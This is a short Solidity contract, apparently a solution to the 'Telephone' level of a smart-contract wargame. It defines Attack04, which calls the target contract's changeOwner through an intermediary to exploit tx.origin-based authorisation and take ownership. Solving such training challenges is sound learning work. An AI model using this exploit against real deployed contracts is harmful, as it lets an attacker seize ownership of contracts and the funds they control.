// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "interfaces/itelephone.sol";
import "./04-telephone.sol";

contract Attack04 {
    // ITelephone private immutable target;
    Telephone telephoneContract;

    constructor(address _telephoneContract) {
        telephoneContract = Telephone(_telephoneContract);
    }

    function attack() public {
        telephoneContract.changeOwner(msg.sender);
    }
}
